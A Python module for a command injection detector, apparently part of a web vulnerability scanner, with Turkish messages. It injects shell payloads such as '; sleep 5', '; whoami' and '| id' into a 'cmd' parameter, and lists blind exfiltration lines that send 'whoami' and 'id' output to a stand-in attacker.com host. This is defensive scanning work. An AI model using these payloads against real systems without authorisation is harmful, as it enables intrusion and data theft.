#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Command Injection Detector
"""

from typing import List, Dict, Any
from loguru import logger
import asyncio
import time

from .base import BaseDetector


class CommandInjectionDetector(BaseDetector):
    """Command Injection Zafiyeti Tespiti"""
    
    # Command separators
    COMMAND_SEPARATORS = [
        ';',
        '|',
        '||',
        '&',
        '&&',
        '`',
        '$()',
    ]
    
    # Time-based command injection payloads
    TIME_BASED_PAYLOADS = [
        "; sleep 5",
        "| sleep 5",
        "&& sleep 5",
        "`sleep 5`",
        "$(sleep 5)",
    ]
    
    # Blind command injection - DNS exfiltration
    BLIND_PAYLOADS = [
        "; nslookup `whoami`.attacker.com",
        "| curl http://attacker.com/?cmd=`id`",
    ]
    
    async def scan(self, url: str, **kwargs) -> List[Dict[str, Any]]:
        """
        Command Injection taraması
        
        Args:
            url: Hedef URL
        
        Returns:
            Bulunan command injection zafiyetleri
        """
        vulnerabilities = []
        logger.debug(f"🐛 Command Injection taraması başlanıyor: {url}")
        
        try:
            # Time-based command injection
            time_based = await self._test_time_based_command_injection(url)
            if time_based:
                vulnerabilities.append(time_based)
            
            # Basic command injection
            basic = await self._test_basic_command_injection(url)
            if basic:
                vulnerabilities.append(basic)
        
        except Exception as e:
            logger.debug(f"❌ Command Injection tarama hatası: {str(e)}")
        
        return vulnerabilities
    
    async def _test_time_based_command_injection(self, url: str) -> Dict[str, Any] or None:
        """Time-based command injection testi"""
        
        for payload in self.TIME_BASED_PAYLOADS:
            test_url = f"{url}?cmd=ping{payload}"
            
            try:
                start_time = time.time()
                response = await self._get(test_url, timeout=aiohttp.ClientTimeout(total=15))
                elapsed_time = time.time() - start_time
                
                if elapsed_time >= 5:
                    return self._create_vulnerability(
                        type_='Time-based Command Injection',
                        severity='Critical',
                        url=url,
                        description='Sistem komutu çalıştırılabiliyor',
                        recommendation='Komut çalıştırma yerine API kullan',
                        poc=payload,
                        cwe='CWE-78',
                        cvss_vector='CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H'
                    )
            except asyncio.TimeoutError:
                return self._create_vulnerability(
                    type_='Time-based Command Injection',
                    severity='Critical',
                    url=url,
                    description='Sistem komutu zaman gecikmesi ile çalıştırılabiliyor',
                    recommendation='Komut çalıştırma yerine API kullan',
                    poc=payload,
                    cwe='CWE-78',
                    cvss_vector='CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H'
                )
        
        return None
    
    async def _test_basic_command_injection(self, url: str) -> Dict[str, Any] or None:
        """Temel command injection testi"""
        
        payloads = [
            "; whoami",
            "| id",
            "&& uname -a",
        ]
        
        for payload in payloads:
            test_url = f"{url}?cmd=ping{payload}"
            response = await self._get(test_url)
            
            if response and any(keyword in response for keyword in ['root', 'uid=', 'Linux', 'Darwin']):
                return self._create_vulnerability(
                    type_='Command Injection',
                    severity='Critical',
                    url=url,
                    description='Sistem komutu dorudan çıktıda görülüyor',
                    recommendation='Komut çalıştırma yerine API kullan',
                    poc=payload,
                    cwe='CWE-78',
                    cvss_vector='CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H'
                )
        
        return None
